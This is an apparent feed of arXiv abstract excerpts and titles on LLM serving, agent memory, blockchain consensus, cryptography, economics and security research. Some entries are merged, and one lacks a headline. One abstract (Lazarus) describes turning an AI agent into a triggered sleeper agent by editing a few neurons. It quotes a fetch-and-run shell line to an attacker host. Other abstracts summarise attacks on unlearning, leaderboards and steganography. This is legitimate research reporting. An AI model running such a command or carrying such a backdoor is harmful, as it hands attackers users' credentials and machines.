events.excerpt: arXiv:2611.16487v1 Announce Type: new Abstract: Embodied agents make decisions by combining information from heterogeneous memory modules, including declarative memory for explicit knowledge, procedural memory for learned routines, and working memory for current observations. During interaction, the memory contents required for decision making change with the agent's state, goal, and task progress, while many contents remain shared across consecutive decisions. However, existing memory modules are typically accessed through separate interfaces, so each updated memory context is often processed as a new input to the foundation model. This prevents selective key-value (KV) cache reuse for unchanged memory contents and forces full KV cache recomputation even when much of the memory context remains valid. We introduce HeMeR, an inference framework that performs KV reconciliation between dynamically updated memory contexts and reusable KV states. HeMeR tracks declarative, procedural, and working memory contents across action decisions, preserves KV states for unchanged contents, and reconciles only the KV states affected by memory-content updates. This enables efficient and stable inference as memory contents evolve during interaction. We evaluate HeMeR on ALFWorld, Habitat, and real-
events.headline: HeMeR: Heterogeneous Memory Reconciliation for Embodied Agents via Structured KV Reuse

events.excerpt: arXiv:2611.17097v1 Announce Type: cross Abstract: Large language model (LLM) inference at datacenter scale is fundamentally bottlenecked by memory capacity and bandwidth limits. Because model weights are read-only and identical across instances, conventional architectures that replicate these parameters across the local DRAM of tens of thousands of accelerators incur massive capital expenditures, significant static power dissipation, and redundant memory-fetch energy. A recent proposal to use optical fiber loops as delay-line memory alleviates these issues, but its recirculating loop must hold the whole model: loop length grows with model size, slack is fixed when the ring is built, and the layouts that serve modern Mixture of Experts (MoE) models efficiently do not fit in it. We propose Optical Broadcast Memory (OBM), an open-ended hierarchical Tap-and-Amplify fiber architecture that generalizes and replaces the optical ring paradigm. A centralized memory server continuously broadcasts weights to distributed inference nodes that passively tap the data stream using receive-only co-packaged optics, delivering parameters directly to compute units without intermediate buffering. To overcome the limitations of continuous weight streaming, we use dynamically-sized slack to accommodate
events.headline: Broadcast, Don't Replicate: Eliminating Weight HBM in Datacenter LLM Serving

events.excerpt: arXiv:2611.15013v1 Announce Type: new Abstract: Machine unlearning lets the owner of large language models (LLMs) remove specific entities from a trained model without retraining from scratch. Existing machine unlearning methods focus on removing the requested entities while maintaining utility. However, we observe that the representations of distinct entities in an LLM may overlap in shared parameter subspaces, a phenomenon known as knowledge superposition. Removing one entity may then affect other entities. This exposes a new security threat: legitimate unlearning requests can be exploited to remove sensitive entities that were never requested. This threat is unlike data poisoning or backdoor attacks. We define the attack as the Proxy Unlearning Attack (PUA), which selects removable proxy entities superposed with a sensitive target. The attack can even occur unintentionally, when benign users accidentally remove entities superposed with a sensitive one. In response, we propose Superposition-Aware Unlearning Protection (SAUP), a general defense framework that can be applied to unlearning requests to ensure a correct removal. SAUP performs in two stages. Before unlearning, it uses superposition detection to estimate which sensitive entities the request puts at risk. After unlearn
events.headline: Protecting Sensitive Knowledge Under LLM Unlearning: The Proxy Threat and a Superposition-Aware Defense

events.excerpt: arXiv:2611.15747v1 Announce Type: new Abstract: Responses to earnings surprises depend on an unknown multiplier mapping earnings to value. Investors, however, learn about the news and the multiplier from the same number. Large surprises may indicate small multipliers and tiny surprises large ones. We model how greater uncertainty about the multiplier attenuates responses on average but makes them steeper near zero surprises. In an incentivized experiment, we find that greater processing constraints lower average sensitivity but raise it near zero. We confirm this with real-world earnings announcements: stocks with higher valuation uncertainty, our proxy for multiplier uncertainty, respond less on average but more steeply near zero.
events.headline: Huge If True: Learning from the Size of the Surprise

events.excerpt: arXiv:2611.15315v1 Announce Type: new Abstract: Language models evolve, but the observations, revisions, and context accumulated through user interactions should remain usable. Each new model must be able to retrieve past evidence, track revisions, and add new observations. We present MIGRO, a decoupled long-term memory system that treats experience as a persistent state shared across successive language models. MIGRO follows a simple principle: preserve historical evidence exactly, organize it approximately, and decide what to retrieve only when the question is known. We call this asymmetric fidelity with deferred selectivity. A shared semantic index supports retrieval, while exact records retain observations and their historical relationships. Because models differ in vocabulary and tokenization, host-specific interfaces convert selected evidence into inputs the receiving model can use. Reversible encoding reduces archival storage while enabling exact recovery. The shared state and its access interfaces let successive hosts read and extend the accumulated experience. On matched LoCoMo states, MIGRO scores 7.3% higher and uses 99.3% less private memory than the strongest quality baseline. After handoff, continued writing retains 99.9% of full-history rebuilding quality by extend
events.headline: MIGRO: A Decoupled and Portable Long-Term Memory System for Language Models

events.excerpt: arXiv:2611.16890v1 Announce Type: new Abstract: Attributing short LLM-generated texts to a specific source remains challenging for existing multi-bit watermarking methods, which often require long generations or costly decoding to recover payloads reliably. We propose a codebook-based watermarking scheme that maps an $n$-bit payload to a longer $u$-bit codeword and embeds it during generation through token-level logit biasing. During extraction, the received bit sequence is matched to the nearest codeword in a precomputed secret codebook using Hamming or Levenshtein distance. Experiments show that our method achieves near-perfect recovery for 16-24 bit payloads on 200-token generations and strong performance on 127-token generations for base models. Results are weaker on some instruction-tuned models with very short texts, where low-entropy output distributions reduce embedding reliability. We also study a BCH-based variant that avoids codebook storage but generally reduces robustness. The Levenshtein variant improves resilience to deletions and light paraphrasing, while insertions and stronger rewrites remain challenging. We analyze collision probability, codeword separation, extraction time, tokenization consistency, and text quality, highlighting both the practicality and limi
events.headline: Look It Up: Multi-bit LLM Watermarking via Codebook Search

events.excerpt: arXiv:2607.22209v2 Announce Type: replace Abstract: In blockchain systems, peer-to-peer (P2P) overlay networks play a crucial role in providing reliable, scalable and efficient message-delivery services to upper layers. However, the consensus layer and the underlying P2P network remain mutually opaque in existing blockchains, waiving the opportunity for further improvement. In contrast to other P2P applications, blockchain can naturally be abstracted as a state machine. We therefore leverage this abstraction to record network topologies and latencies in a trusted and coordinated manner. With this support, we propose three improvements to rotating-leader consensus protocols and their underlying P2P networks: (1) accelerating leader rotation; (2) introducing a reliable-broadcast paradigm that employs tree-based dissemination in the normal case and falls back to gossip only when necessary; and (3) constructing latency-aware dissemination trees. We integrate the above ideas into Tendermint and libp2p, and conduct empirical evaluation on Amazon EC2 platform using up to 300 nodes distributed across 10 regions. The results demonstrate that, compared with gossip-based dissemination over the same topology, our prototype improves peak throughput by up to $7.26\times$.
events.headline: Duet: Co-Optimizing P2P Message Propagation and Rotating-Leader Consensus

events.excerpt: arXiv:2611.14804v1 Announce Type: new Abstract: Costly simulations and experiments limit the data available for engineering design. This paper proposes GenPFN, a training-free candidate generator guided by a pretrained tabular Prior-Data Fitted Network (TabPFN) classifier with fixed weights. The context contains evaluated designs labeled desired (Class 1) or undesired (Class 0). GenPFN interpolates between desired designs and refines candidates using gated classifier gradients and Gaussian noise. Each candidate is evaluated using the problem's constraints and objective functions. Evaluated desired designs and their objective values augment the context for regression training. Evaluation spans fourteen selected problems, including a two-parameter benchmark and a 44-parameter hull problem. In paired comparisons, GenPFN with TabPFN v1 achieves higher class satisfaction and lower realism distance than the tested adversarial, variational-autoencoder and diffusion generators. The variational-autoencoder generator provides greater coverage and diversity. Relative to the synthetic minority over-sampling technique (SMOTE), GenPFN provides lower coverage distance and greater diversity. events.headline: GenPFN: An In-Context Tabular Foundation Model Approach for Augmenting Small Datasets in Engineering

events.excerpt: arXiv:2611.17184v1 Announce Type: cross Abstract: As multi-proposer protocols push consensus throughput, transaction execution has become the dominant bottleneck in blockchains. Layer-1 blockchains parallelize execution either pessimistically (Solana, Sui), requiring upfront state-access declarations and serializing contended transactions, or optimistically (Aptos, Sei, Monad), resolving dependencies at run time but suffering cascading aborts under contention. Both treat blocks in isolation, leaving inter-block parallelism unexploited and most cores idle. We introduce Omakase, a parallel execution framework that combines pre-execution, inter-block conflict-graph integration, and graph-aware Optimistic Concurrency Control (OCC). Replicas use idle cores to pre-execute only the blocks they propose, spreading prediction work across concurrent proposers. After building per-block conflict graphs and identifying their hot resources, a greedy scheduler integrates graphs across the blocks committed in a round, keeping an integration only when a lightweight balance heuristic predicts a parallelism gain. events.headline: Omakase: Execution Congestion Control through Conflict-Graph Integration in Multi-Proposer Blockchain

events.excerpt: arXiv:2611.16467v1 Announce Type: new Abstract: Sharded data parallelism enables memory-efficient training of large models. While efficient training kernels favor packed, kernel-specific data layouts, optimizers may require variant data structures as optimization units. Existing sharded data-parallel frameworks couple these two choices, limiting runtime efficiency and optimization flexibility. To address this, we present \textbf{\our}, a training framework that separates runtime parameters from update parameters, allowing computation layouts and optimization units to be organized independently. Through shared data views and hierarchical sharding, \our supports this separation while avoiding redundant data movement. This design supports a broad range of optimizers, including matrix-based methods such as Muon, and performance optimizations such as fully zero-copy execution. Experiments on video and language model workloads with MXFP8 training show that \our achieves higher Model FLOPs Utilization (MFU) than FSDP2, veScale-FSDP, and Megatron-FSDP. At 128 GPUs, MFU improves by up to 21.7\% over the fastest evaluated baseline, with comparable or lower peak memory usage.
events.headline: SS-HSDP: Efficient and Flexible Sharded Data Parallelism via Runtime-Update Decoupling

events.excerpt: arXiv:2611.14766v1 Announce Type: new Abstract: All social interactions are situated in time. Previous studies have shown that humans are able to use implicit temporal cues, such as the duration of a pause, to infer others' mental states. But how do humans use temporal cues for dynamic, fine-grained social coordination? And can AI systems do the same, without ``experiencing'' continuous real-time as humans do? We study these questions using a cooperative card game task called The Mind, which requires players to achieve a shared goal across repeated interactions but forbids explicit communication: the only available signal is the passage of time. We evaluate 150 humans, and two classes of AI models which reflect different ways of operationalizing time in artificial systems: computer-use agents (CUAs), and standard text-prompted LLMs. We find that human behavior is best captured by a Bayesian strategy that infers a partner's belief from their timing---and similarly for frontier models. However, unlike humans, none of the tested models seem to efficiently adapt their behaviors to their partners' over the course of the game. events.headline: Rational Use of Time for Social Coordination in Humans and AI

events.excerpt: arXiv:2611.14928v1 Announce Type: new Abstract: Hybrid bonding terminal (HBT) legalization assigns every terminal of a face-to-face 3D IC to its own pitch-grid site with minimum total Manhattan displacement. Open3DBench reports that a reinforcement-learning (RL) legalizer reduces displacement by 19-22% relative to a sliding-window (SW) heuristic, but none of its legalizers is publicly released. We ask how much displacement any legalizer can still recover. We build an open benchmark of 21 design/pitch instances from Open3DBench placement data, with reconstructed greedy, SW (ViaLegal-style) and BTAssign-style baselines, and GEO-Exact, an exact solver that runs successive shortest augmenting paths over lazily generated spatial candidate edges. An independent dual certificate proves its assignment optimal on all 21 instances (relative primal-dual gap at most $8.2 \times 10^{-16}$). events.headline: Provably Optimal HBT Legalization in Seconds: Certified Optima Reveal Where the Headroom Really Lies

events.excerpt: arXiv:2611.15118v1 Announce Type: new Abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps. The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026. events.headline: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents

events.excerpt: arXiv:2611.14942v1 Announce Type: new Abstract: Does multimodal training shape how a language model thinks, even when the input is text only? We test this with targeted causal ablations across 10 multimodal configurations from 6 model families, with matched text-only backbones and cross-family transfer controls. We contrast spatial-imagery tasks that invite mental scene construction with symbol-manipulation tasks solvable by symbolic rules alone. We identify a vision-language axis in hidden-state space and ablate its projection at inference. In Chameleon-7B, this ablation drops accuracy on BIG-Bench Hard (BBH) navigate by 27.6 pp while leaving boolean expressions intact (+5.6 pp), a 33.2 pp double dissociation. The effect is direction-specific and layer-localized, extends to mental-simulation tasks such as mental rotation, paper folding, and perspective taking, and is not explained by task difficulty, reasoning depth, or sequential update load. Together, these results reveal emergent vision-shaped thinking (EVT): text-only reasoning that causally recruits representations introduced or strengthened by vision-language training, without assuming an image-like internal format. events.headline: Emergent Vision-Shaped Thinking in Text-Only Reasoning through Multimodal Training

events.excerpt: arXiv:2506.15103v3 Announce Type: replace Abstract: The rapid rise of e-commerce has transformed consumer behavior, prompting questions about how online adoption influences offline shopping. We examine whether consumers who adopt a retailer's online shopping channels become more price-sensitive in their subsequent offline purchases with that retailer. Using transaction-level data from a large Brazilian pet supplies retailer operating both online and offline, we compare "adopters" -- customers who began shopping online after a period of offline-only purchasing -- with "non-adopters" who remained offline-only. We estimate a discrete choice logit model with individual-level heterogeneity, based on an algorithm that can handle both high-dimensional fixed effects and price endogeneity. We then apply a staggered difference-in-differences approach to the estimated price elasticities and obtain the Average Treatment Effect on the Treated (ATT). We find that offline price sensitivity increases significantly after online adoption in three out of four product categories. Our results underscore the importance of recognizing cross-channel effects in consumer behavior and contribute to the literature on pricing and multichannel retailing by identifying online adoption as a key driver of offlin
events.headline: How does online shopping affect offline price sensitivity?

events.excerpt: arXiv:2611.15019v1 Announce Type: new Abstract: Encrypted tunnels are widely used to circumvent censorship, which has drawn censors' efforts to detect and block them. As the circumvention tunnels in widest use have largely converged on TLS, detection has shifted from the content of their traffic to its shape, where recent research and real-world blocking events have revealed exploitable fingerprints of tunneling. Existing traffic-shaping obfuscators such as obfs4, however, are fundamentally limited in hiding these fingerprints, as their application-driven design can only add to the shape that the application creates. A schedule-driven obfuscator, which decides when and how much to send independently of the application, can give tunnels any shape but raises new challenges, first and foremost what a good shape is. This paper presents obfsgen, a schedule-driven obfuscator for tunneling traffic. obfsgen samples its schedule from a generative sequence model of normal traffic, which predicts the future shape of a flow from its whole history, to capture the long-range dependencies that make a flow's shape normal. Built around this model, obfsgen addresses system problems that such an obfuscator faces in practice, such as synchronization across a noisy network. We evaluate the (in)distin
events.headline: obfsgen: Generative Tunnel Obfuscation

events.excerpt: arXiv:2611.17102v1 Announce Type: new Abstract: An unconditionally secure $(t, s, v)$-all-or-nothing transform (AONT) is a bijection from $s$ input elements to $s$ output elements over an alphabet of size $v$, such that given any $s - t$ output elements, no information can be obtained about any $t$ input elements. While linear AONTs have been extensively studied, comparatively little is known about the existence of non-linear AONTs. In this paper, we investigate unconditionally secure cryptographically non-linear $(t, s, v)$-AONTs, distinguishing between non-additivity, non-affinity, and cryptographic non-linearity. To achieve this, we first present a computational method for enumerating general AONTs focusing on the case $(t, 3, 3)$-AONTs for $t = 1 and 2$, establishing the existence of non-additive AONTs. We then introduce a general construction of non-additive AONTs from linear ones using coordinate-wise symbol permutations. We measure the non-linearity of the AONT instances generated from this construction, using differential $\Delta_F$-uniformity and Walsh magnitude. Finally, we establish theoretical conditions under which $\Delta_F$-uniformity is reduced and present statistical results examining the non-linearity of AONTs obtained through our construction.
events.headline: On cryptographically non-linear all-or-nothing transforms

events.excerpt: arXiv:2611.15006v1 Announce Type: new Abstract: Large language model (LLM) agents increasingly interact with tools and environments, yet plausible model decisions do not always translate into successful execution due to tool-call mismatches, interrupted workflows, and unsupported completion claims. We present EvoX, a Rust-based, multi-model agent runtime guided by The Second Policy, which views the harness as an Operational Policy complementing the foundation model's Semantic Policy. EvoX combines model-facing guidance with deterministic runtime control through three complementary mechanisms: Action Realization, Execution Continuity, and Outcome Grounding. To evaluate harnesses without suppressing their native behaviors, we introduce Contrast, a controlled and auditable framework integrating explicit fairness constraints, provider-bound request verification, and evidence-based adjudication. Across five benchmarks, six foundation models, and six agent harnesses, EvoX achieves the highest numerical success rate of 56.2% over 691 common task--model pairs, exceeding the average of the other five harnesses by approximately 3.0 percentage points. Its larger advantages on GLM-5.3 (+10.7 points) and Kimi K3 (+7.9 points) highlight the model-dependent effectiveness of harness design and t
events.headline: EvoX: Rethinking the Agent Harness as a Runtime Policy

events.excerpt: arXiv:2611.15097v1 Announce Type: new Abstract: Web agents need to use private context without unnecessarily disclosing it. Effective protection must distinguish between requests that may be sent after sanitization and those that must be withheld, while preserving the information needed for authorized tasks. We present GuardianAgentFlow, a multi-agent framework that mediates outgoing Web requests through an explicit release contract. A dedicated restriction check grounds permission in the user's instruction; a shared protection scope aligns rewriting with disclosure checking; and candidate-grounded feedback guides revision before transmission. Experiments on Web requests with human-reviewed intent labels show improved request-contract success, while controlled comparisons and role ablations identify the contributions of restriction handling, policy evidence, and candidate checking. Evaluations of action proposals from PrivacyLens and AgentDAM demonstrate complementary protection when mediation is composed with privacy-aware agents. Experiments with smaller mediation models show that the coordination benefit persists with reduced model capacity. Dedicated-server measurements show lower mediation latency than full-policy reasoning, while real-site browser tests quantify integration
events.headline: GuardianAgentFlow: Multi-Agent Coordination for Web Privacy Protection

events.excerpt: arXiv:2611.16066v1 Announce Type: cross Abstract: We study the average one-guess success probability of an adversary who observes the ordinary integer sum of a finite-support secret and an independent integer-valued mask, subject to an absolute-moment budget on the mask. For a uniform secret on an interval the exact optimum and an explicit optimiser are obtained. For a biased bit the masks that achieve no increase over the prior baseline are characterised and their minimal cost is determined. The entire cost-vulnerability frontier is then determined for every bias. It is the piecewise-linear interpolation of an explicit sequence of points generated by cost-optimally shifted truncated geometric masks. It has infinitely many affine pieces, which accumulate at the critical cost, where the frontier meets the prior baseline with zero slope. The proof rests on a layer-cake decomposition of an arbitrary mask into truncated geometrics, along which both the vulnerability and the cost are exactly additive. The results give exact design guidance for additive integer noise under the average one-guess metric; they do not constitute a cryptographic masking scheme.
events.headline: Optimal Additive Integer Masks for One-Guess Vulnerability under an Absolute-Moment Budget

We compare a benchmark's real hardware grouping with size-matched random groupings of the same devices, using calibrated, unclipped variational lower bounds under label-blind, device-level cross-fitting on devices never seen in training. On WiSig (OFDM Wi-Fi), the generation grouping exceeded all 999 matched random groupings (permutation p = 0.001, the resolution floor), although no grouping attained a positive certified bound, and the direction survives removing channel equalization. A preregistered replication on a LoRa corpus (chirp spread spectrum, three hardware models), with a front-end frozen on synthetic data, again exceeded all 999 (p = 0.001), and two sensitivity analyses judged by a reversal rule fixed in advance did not reverse the direction. This is a directional replication only: the excess magnitude reflects a miscalibrated null, the chain-rule decomposition leaves a residual of +0.296 bits, and capture order is undocumented. events.excerpt: arXiv:2611.15017v1 Announce Type: cross Abstract: Multiagent research inherited its economic vocabulary of auctions, markets, prices, bargaining, and matching from a single observed case: human societies. Those institutions bundle identity, competence, execution, ownership, commitment, and settlement in ways that suit agents whose minds are private, who learn rather than copy skills, and who each persist as one person. Engineered agents need not share any of these constraints, making the list of familiar institutions look less like the entirety of economic organization and more like a sample from a larger, unmapped space. We sketch one way to make that space concrete: a provisional chart that records each institution, separately from the agents that run it, as a typed structure over positions, rights and duties, allocation, information, time, state, process, value, and external recognition. In this chart, named institutions become overlapping regions rather than fixed points, neighboring families separate along a few coordinates, and the gaps between them become places to search. events.headline: Beyond Named Mechanisms: Economic Institutions as a Design Space for Artificial Agents

events.excerpt: arXiv:2611.15847v1 Announce Type: new Abstract: Tendermint is a consensus protocol that tolerates Byzantine faults, implemented first by the Tendermint Core engine and now by CometBFT. Realizing the protocol's separation of agreement from execution, the Application Blockchain Interface (ABCI) of these engines keeps consensus apart from the replicated application, so one engine can serve many independent proof-of-stake chains. A sustained body of research proposes changes that span the protocol's mechanisms, from vote dissemination to block proposal and reward distribution, yet to our knowledge no survey studies the protocol and these works as one family, and broader surveys do not take Tendermint as their subject. We describe the baseline, the protocol as consolidated from its original descriptions, by its design choices. Each is a decision, such as how votes spread or how proposers rotate, through which the baseline provides safety and liveness or another property under its fault and timing model. We classify each work by the design choice it renegotiates, that is, modifies or replaces, by the properties it strengthens or weakens, and by whether its result needs a stronger model. events.excerpt: arXiv:2611.16301v1 Announce Type: cross Abstract: Reinforcement learning (RL) increasingly targets small language models, and executing these workloads efficiently across multiple accelerators requires effective coordination. On TPUs, Pathways-based RL uses a single controller to coordinate computation across hosts. This execution model is effective for large models, but its coordination computational costs are harder to amortize when small models repeatedly invoke short computations. To characterize these computational costs, we sweep dense models from 0.6B to 405B parameters on TPU v7x under a decode-heavy workload and measure how host and network computational overhead vary with model size. At 0.6B, host orchestration occupies 36% of step time and network communication 2%, whereas for large models, estimated network computational costs dominate the non-compute time. Motivated by these findings, we present Local Coordination JAX (LoCoJAX), which implements local rollout and reward processing on each TPU host with synchronous global training. events.headline: LoCoJAX: Host-Local Coordination for Small-Model RL on TPUs

events.excerpt: arXiv:2611.15178v1 Announce Type: new Abstract: Reinforcement learning sharpens LLM reasoning, but parameter updates are expensive, forgetful, and opaque; training-free libraries swap gradients for a textual store but still use trajectory-level, correlation-based admission and flat structure. To address both, we propose HyperSkill, a Training-Free Omnimodal GRPO framework that keeps the backbone frozen and replaces gradient updates with auditable edits to a Hypergraph-Indexed Skill-Library, where skills are advantage-bearing nodes and compositions are hyperedges. It has three components: training-time distillation admits counterfactually checked skills and learns a protocol skill from failures; gated hypergraph retrieval injects advantage-ranked skills where a per-dataset gate admits them; and an execution protocol makes the frozen backbone commit to an answer. On 11 text, vision-language, and omnimodal benchmarks, HyperSkill is best or tied on every dataset and beats the best baseline by 13.0 average F1 points while keeping the backbone frozen. Our software and data are publicly available at https://github.com/LHRLAB/HyperSkill.
events.headline: HyperSkill: Training-Free Omnimodal GRPO via Hypergraph-Indexed Skill-Library Evolution

events.excerpt: arXiv:2611.15481v1 Announce Type: new Abstract: Recently developed remote sensing (RS) agents execute real-world tasks with complex workflows through multi-step tool invocation. These agents, however, typically rely on predefined expertise or parameter updates. They thus require updating expert knowledge or retraining models whenever new tools, tasks, or execution patterns emerge, limiting their continual adaptability in dynamic Earth environments. In this work, we seek to equip general-purpose agents with RS tool-call knowledge that can be automatically extracted from demonstrated trajectories without expert intervention or parameter updates. Specifically, we propose SkillEarth, a self-evolving skill extraction method that externalizes RS tool-call knowledge as reusable, retrievable, and evolvable skill files and refines them through observation-grounded evolution. Unlike existing automatic skill extraction methods that rely on outcome-based reflection to refine skills holistically, SkillEarth grounds skill evolution in real tool-chain execution and combines dual-judge feedback with a grounded observation routing graph for precise component-level refinement. events.headline: SkillEarth: Teaching General-Purpose Agents to Act on Earth via Skill Evolution

events.excerpt: arXiv:2611.15583v1 Announce Type: new Abstract: In this work, we ask whether an attacker can go beyond detecting a hidden image and tell what it depicts, even without knowing which model hid it. We show that, for deep image hiding, this is surprisingly easy. To test this, we build an evaluation dataset of stego images generated by 11 hiding models. These models span two families (invertible neural networks and autoencoders), use different backbones (CNN, Transformer, and Mamba), and include both spatial- and frequency-domain hiding methods. We demonstrate that training HiNet [17] in the usual way yields a single decoder that can extract secret content from unseen models across these settings. Both humans and machines can recognize what it reveals. A frequency analysis shows that most models favor mid- and high-frequency embedding. Guided by this finding, we strengthen cross-model extraction by enhancing cover textures and suppressing secret textures during training. The attack extends to out-of-distribution secrets and to multi-image hiding. It even exposes private content hidden by AIRPNet [13], a recent image restoration method that uses steganography for privacy protection. events.headline: Your Secrets Are Showing: Deep Image Hiding Models Are Surprisingly Easy to Attack

events.excerpt: arXiv:2605.17757v2 Announce Type: replace-cross Abstract: INT2 KV-cache quantization is attractive for long-context LLM serving, yet making it both accurate and practical remains challenging. Data-oblivious rotations such as Hadamard transforms flatten channel outliers, but still degrade sharply at INT2 because they ignore how downstream attention queries the cache. We propose OSCAR, an ultra-low-bit KV-cache quantization method that estimates attention-aware covariance targets offline and uses them to derive fixed per-layer rotations and clipping thresholds. By aligning the quantization basis with the second-moment structures consumed by attention, OSCAR preserves attention fidelity at 2-bit precision. Beyond theoretical analysis under a frozen-error surrogate, we build a serving-ready OSCAR system with fused Triton write and decode kernels that preserve paged KV-cache layouts and prefix caching, integrating into modern serving engines such as SGLang and vLLM. We evaluate OSCAR on reasoning and coding benchmarks with generation traces of up to 32K tokens across five tasks. On Qwen3-4B-Thinking-2507 and Qwen3-8B, OSCAR narrows the BF16 accuracy gap to 3.78 and 1.21 points, respectively, where Hadamard-only INT2 collapses, and matches BF16 within run-to-run variance on Qwen3-32B a
events.headline: OSCAR: Offline Spectral Covariance-Aware Rotation for 2-bit KV Cache Quantization

events.excerpt: arXiv:2502.21037v3 Announce Type: replace-cross Abstract: Individuals and organizations increasingly consider delegating decision-making to AI agents, which may significantly alter social contagion dynamics. We ask whether artificial agents exhibit different adoption thresholds from those of human subjects when making decisions and, if so, how such differences may affect the spread of social contagions. To answer these questions, we conduct two choice experiments - recently administered to human participants - with artificial agents powered by large language models (LLMs). Across two domains and five LLMs, artificial agents exhibit systematically lower adoption thresholds than human subjects. Simulations of diffusion calibrated with the experimental findings show that, holding network structure fixed, even a modest share of artificial agents leads to higher total adoption. Our findings suggest that the presence of artificial agents in social networks can alter diffusion.
events.headline: The amplifier effect of artificial agents in social contagion

events.excerpt: arXiv:2611.14769v1 Announce Type: new Abstract: Arena-style rankings of language models are a widely used evaluation framework in online leaderboards, research papers, and model evaluation in production. These rankings aim to realistically assess model performance using pairwise comparisons of anonymous models on user prompts, aggregating votes via the Bradley-Terry model to produce the final ranking. However, we find that these leaderboards are highly vulnerable to several manipulation strategies that unscrupulous providers could use to boost a model's rank: strategic voting (individual votes that boost a model's rank, including votes on irrelevant models), strategic prompting (choosing prompts that favor a model), and strategic nomination (boosting the rank of a model by inserting irrelevant models). We demonstrate these effects on public leaderboard data, analyze the circumstances that cause these vulnerabilities, and describe approaches to safeguard against each attack. Notably, these issues hold for any preference-based evaluation using the Bradley-Terry model that allows open prompting, voting, or model submission. These manipulations boost the rank of nearly every tested model; each attack can boost a model by up to 15-20 places in a ranking and, combined, they can boost a
events.headline: Leaderboard Hacking: Preference-Based Model Evaluations are Vulnerable to Manipulation

events.excerpt: arXiv:2611.15316v1 Announce Type: new Abstract: Building and evaluating security tools for IoT firmware requires targets whose weaknesses are known in ad- vance and can be reproduced in a running device. Two problems remain: (1) firmware collected from real-world products provides realistic software, but hardware dependencies and undocumented defects make it difficult to establish what a security tool should be expected to find; and (2) existing benchmarks typically collect sets of vulnerable or misconfigured firmware images without providing purpose-built vulnerable services with explicit weaknesses that a security analysis tool can target. We present IoTPwnBench, a synthetic, modular benchmark that brings these requirements together. IoTPwnBench contains 716 vulnerable firmware images covering 86 weakness scenarios and 28 CWE classes across 11 device profiles, including industrial controllers, health monitors, and household devices. Each vulnerable image runs a plausible device application with simulated sensors and actuators that generate live readings over its native interfaces while exposing one target weakness mapped to a primary CWE. A documented exploitation payload and observable signal establish the expected behavior independently of the evaluated tool. Every vulnerable
events.headline: IoTPwnBench: A Synthetic Benchmark for IoT Firmware Security Analysis

events.excerpt: arXiv:2611.16661v1 Announce Type: new Abstract: Efficient batch execution of agent tasks is critical to LLM training and development workflows, including benchmark evaluation, synthetic-data generation, and RL rollouts. Since these tasks alternate between LLM inference and environment interaction, we present coordinated optimizations to reduce batch makespan, the time required to complete all tasks in a batch. For hybrid LLMs, a workload-based resource model guides GPU-memory allocation between key-value (KV) cache and recurrent state and provides a reference sample concurrency to exploit parallelism while limiting recomputation. Trajectory-aware routing and scheduling promote cache reuse while balancing worker load. Under constrained environment capacity, we decouple sample admission from environment execution and introduce Chain-Advancing Action Scheduling (CAAS), which prioritizes long chains using observed progress to shorten the batch tail. Controlled replay combines actual inference with recorded environment responses and durations for ablations of individual optimizations. Live evaluations with Ling-3.0-Flash and Ling-3.1-Flash on the BFCL, SWE-bench Multilingual, WideSearch, and MCP-Atlas benchmarks demonstrate makespan reductions of 10.4% to 65.0%, while evaluation score
events.headline: Reducing Batch Makespan for LLM Agent Workloads through Inference-Environment Coordination

events.excerpt: arXiv:2611.15615v1 Announce Type: cross Abstract: We present \parallelBatchBMatch, a parallel batch-vote algorithm for maximal $b$-matching in hypergraphs. The algorithm is deterministic for a given ordering of edges and produces the same output as the sequential greedy algorithm, i.e., the lexicographically first maximal $b$-matching. Under a uniformly random priority order it performs $O(m')$ expected work in the binary fork--join model, where $m'$ is the number of pins, the total number of vertex--edge incidences. The algorithm performs at most $m$ rounds for every priority order, where $m$ is the number of edges. Every round of the algorithm has $O(\log^2 m')$ depth with high probability, and thus the total depth of the algorithm is $O(m \log^2 m')$ with high probability. We implement the parallel algorithm in CUDA and evaluate it on real-world hypergraphs with capacities $b \in \{1, 3, 5\}$. The parallel algorithm computes the same matchings as the greedy algorithms and for the case of $b = 5$ it is up to $19.07$ times faster than the existing state-of-the art greedy algorithm.
events.headline: A Parallel Greedy Algorithm for Maximal b-Matching in Hypergraphs

events.excerpt: arXiv:2611.15843v1 Announce Type: new Abstract: Generative AI agents are increasingly being embedded into visualization systems that can search data, invoke tools, summarize evidence, and produce recommendations. However, when agents rely solely on their own knowledge, the visualization problem is not only whether the agent provides a useful answer, but also whether users can inspect how that answer is grounded. We present Food Critic, an agentic visualization system for diners' restaurant decision support that integrates public health inspection records with crowd review data. The system grounds agents under three conditions: a database-only ReAct agent, a retrieval- augmented agent with access to food-safety regulations, and an ontology-guided agent that produces structured hypotheses and typed evidence. Food Critic externalizes the agent's reasoning within these groundings as inspectable visual evidence. We evaluate LLM models with several use cases under each grounding of our agentic system. Our work positions restaurant choice as a concrete case for studying human-agent collaboration, visual provenance of agent reasoning, and the design of visual interfaces for grounded GenAI decision support.
events.headline: Food Critic: An Agentic Visualization System for Auditable Restaurant-Safety Reasoning

events.excerpt: arXiv:2611.16151v1 Announce Type: new Abstract: Hardware fault injection attacks threaten machine learning systems, yet their impact on reinforcement learning (RL) has received little attention despite the use of RL in safety-critical applications. This paper presents a security analysis of Q-Learning implementations under voltage and clock glitching attacks on a ChipWhisperer platform, evaluating five variants: Standard, Robust, Resilient, Linear, and Deep Q-Learning. In standard Q-Table implementations, faults corrupt reward computation, action selection, and Q-value updates during learning, and change the selected action during inference. Robust Q-Learning does not prevent these attacks: NaN and infinite values injected during learning persist in the Q-table, and its greedy policy uses the same code as standard Q-Learning. This paper also evaluates a Resilient Q-Learning variant that applies triple modular redundancy with majority voting. It corrects corruption of a single Q-table copy, but inputs shared by the copies, such as the reward, and the voting code itself remain outside its protection. The analysis extends to Linear and Deep Q-Learning, where faults corrupt stored weights during learning and change actions during inference. Moving beyond benchmark environments, this
